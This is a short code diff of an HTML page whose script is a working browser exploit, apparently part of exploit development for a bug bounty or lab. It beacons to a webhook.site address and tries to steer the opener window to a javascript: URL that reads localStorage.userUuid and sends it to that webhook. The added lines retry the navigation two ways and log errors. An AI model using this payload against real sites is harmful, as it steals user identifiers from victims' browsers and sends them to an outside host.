@@ -2,14 +2,13 @@
 <body style="background:#cfe">
 <script>
 var W='https://webhook.site/034135c8-1713-49c6-b1ee-50f549c9cd93';
+var J='javascript:new Image().src="'+W+'?d="+localStorage.userUuid';
 new Image().src=W+'?p=page';
 setTimeout(function(){
-  try{
-    opener.location='javascript:new Image().src="'+W+'?d="+localStorage.userUuid';
-    new Image().src=W+'?set=ok';
-  }catch(e){
-    new Image().src=W+'?err='+encodeURIComponent(e.name);
-  }
-  setTimeout(function(){window.close()},1500);
+  try{ opener.location.href=J; new Image().src=W+'?t1'; }catch(e){ new Image().src=W+'?e1='+encodeURIComponent(e.name); }
+  setTimeout(function(){
+    try{ opener.location.assign(J); new Image().src=W+'?t2'; }catch(e){ new Image().src=W+'?e2='+encodeURIComponent(e.name); }
+    setTimeout(function(){ window.close(); },1200);
+  },600);
 },700);
 </script>
